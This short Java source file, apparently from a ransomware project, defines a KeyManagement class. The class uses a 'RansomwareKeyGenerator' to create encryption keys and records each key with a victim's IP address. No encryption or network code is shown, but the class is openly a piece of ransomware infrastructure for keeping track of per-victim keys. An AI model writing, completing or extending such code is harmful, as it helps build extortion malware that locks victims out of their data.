package app.keys;

import app.entities.CryptoKey;
import app.exceptions.AlgorithmNotFoundException;
import app.exceptions.InvalidCryptoKeyException;

public class KeyManagement implements Management {
	private RansomwareKeyGenerator generator;

	public KeyManagement() {
		generator = new RansomwareKeyGenerator();
	}

	@Override
	public CryptoKey createAndSaveKey(String encalgo, String ip) throws InvalidCryptoKeyException {
		try {
			return new CryptoKey(ip, generator.generateKey(encalgo), encalgo);
		} catch (AlgorithmNotFoundException e) {
			throw new InvalidCryptoKeyException("Key requierments- algoritm not found", e);
		}

	}
}
